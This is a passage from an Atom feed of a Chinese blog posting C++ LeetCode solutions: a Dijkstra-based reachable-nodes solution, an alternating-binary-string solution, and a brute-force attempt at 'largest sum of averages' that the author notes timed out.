unordered_set&lt;<span class="type">int</span>&gt; visited;</span><br><span class="line">        <span class="type">int</span> reachableNodes = <span class="number">0</span>;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;, greater&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; pq;</span><br><span class="line">        pq.<span class="built_in">emplace</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (!pq.<span class="built_in">empty</span>() &amp;&amp; pq.<span class="built_in">top</span>().first &lt;= maxMoves) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [step, u] = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (visited.<span class="built_in">count</span>(u)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            visited.<span class="built_in">emplace</span>(u);</span><br><span class="line">            reachableNodes++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> [v, nodes] : adList[u]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nodes + step + <span class="number">1</span> &lt;= maxMoves &amp;&amp; !visited.<span class="built_in">count</span>(v)) &#123;</span><br><span class="line">                    pq.<span class="built_in">emplace</span>(nodes + step + <span class="number">1</span>, v);</span><br><span class="line">                &#125;</span><br><span class="line">                used[<span class="built_in">encode</span>(u, v, n)] = <span class="built_in">min</span>(nodes, maxMoves - step);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;edge : edges) &#123;</span><br><span class="line">            <span class="type">int</span> u = edge[<span class="number">0</span>], v = edge[<span class="number">1</span>], nodes = edge[<span class="number">2</span>];</span><br><span class="line">            reachableNodes += <span class="built_in">min</span>(nodes, used[<span class="built_in">encode</span>(u, v, n)] + used[<span class="built_in">encode</span>(v, u, n)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reachableNodes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1758-生成交替二进制字符串的最少操作数&quot;&gt;&lt;a href=&quot;#1758-生成交替二进制字符串的最少操作数&quot; class=&quot;headerlink&quot; title=&quot;1758. 生成交替二进制字符串的最少操作数&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/minimum-changes-to-make-alternating-binary-string/&quot;&gt;1758. 生成交替二进制字符串的最少操作数&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;minOperations&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string s)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = s.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;cal&lt;/span&gt;(s, len, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;), &lt;span class=&quot;built_in&quot;&gt;cal&lt;/span&gt;(s, len, &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;cal&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; string&amp;amp; s, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len, &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; flag)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; count = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(flag &amp;amp;&amp;amp; s[i] == &lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt; || !flag &amp;amp;&amp;amp; s[i] == &lt;span class=&quot;string&quot;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                count++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            flag = !flag;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; count;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&quot;813-最大平均值和的分组&quot;&gt;&lt;a href=&quot;#813-最大平均值和的分组&quot; class=&quot;headerlink&quot; title=&quot;813. 最大平均值和的分组&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/largest-sum-of-averages/&quot;&gt;813. 最大平均值和的分组&lt;/a&gt;&lt;/h2&gt;&lt;h3 id=&quot;超时暴搜&quot;&gt;&lt;a href=&quot;#超时暴搜&quot; class=&quot;headerlink&quot; title=&quot;超时暴搜&quot;&gt;&lt;/a&gt;超时暴搜&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt; sum;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;largestSumOfAverages&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; nums, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; k)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        len = nums.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sum = &lt;span class=&quot;built_in&quot;&gt;vector&lt;/span&gt;&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;(len+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; i &amp;lt;= len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            sum[i] = nums[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] + sum[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;search&lt;/span&gt;(nums, k, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; nums, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; k, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; K, &lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; left_value, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; last_j)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(k == K || i == len) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; left_value + (sum[len] - sum[last_j] + &lt;span class=&quot;number&quot;&gt;0.0&lt;/span&gt;) / (len - last_j);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;search&lt;/span&gt;(nums, k, i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, K+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, left_value + (sum[i] - sum[last_j] + &lt;span class=&quot;number&quot;&gt;0.0&lt;/span&gt;)/(i-last_j), i), &lt;span class=&quot;built_in&quot;&gt;search&lt;/span&gt;(nums, k,i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, K, left_value, last_j));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; a, &lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; b)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; a &amp;gt; b ? a : b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;昨天第一个思路是用排序，找出最大的m个数，这m个数恰好将数组分成k个部分，发现不可行。&lt;br&gt;然后暴力搜索，超时了，暴搜时考虑添加隔板，其中left_value表示当前搜索下标i之前的分组平均值&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
</feed>
